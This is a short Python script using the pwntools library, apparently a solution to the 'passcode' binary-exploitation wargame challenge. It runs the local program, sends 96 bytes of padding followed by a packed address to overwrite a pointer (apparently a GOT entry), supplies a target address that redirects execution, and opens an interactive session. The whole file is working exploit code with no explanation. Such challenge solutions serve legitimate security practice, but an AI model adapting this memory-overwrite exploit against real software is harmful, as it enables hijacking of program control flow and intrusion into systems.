from pwn import *

context.log_level = 'DEBUG'

p = process('./passcode')

p.sendline('a'*96+p32(0x0804a004))
p.sendline(str(0x080485e3))

p.interactive()